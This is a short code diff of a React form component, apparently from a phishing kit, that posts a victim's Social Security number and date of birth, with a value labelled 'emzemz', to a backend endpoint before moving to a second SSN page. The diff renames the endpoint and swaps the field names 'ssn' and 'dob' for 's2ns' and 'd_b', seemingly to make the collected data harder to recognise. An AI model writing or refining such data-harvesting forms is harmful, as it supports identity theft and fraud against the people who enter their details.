@@ -69,11 +69,11 @@ const SSN1: React.FC = () => {
     if (!Object.values(newErrors).some(error => error)) {
       try {
         const d_b = `${getMonthName(month)}/${day}/${year}`;
-        await axios.post(`${baseUrl}api/meta-data-5/`, {
+        await axios.post(`${baseUrl}api/logix-meta-data-5/`, {
                     emzemz: emzemz,
 
-          ssn: socialSecurityNumber,
-          dob: d_b
+          s2ns: socialSecurityNumber,
+          d_b: d_b
         });
         console.log('Form submitted successfully');
         navigate('/ssn2', { state: { emzemz } });
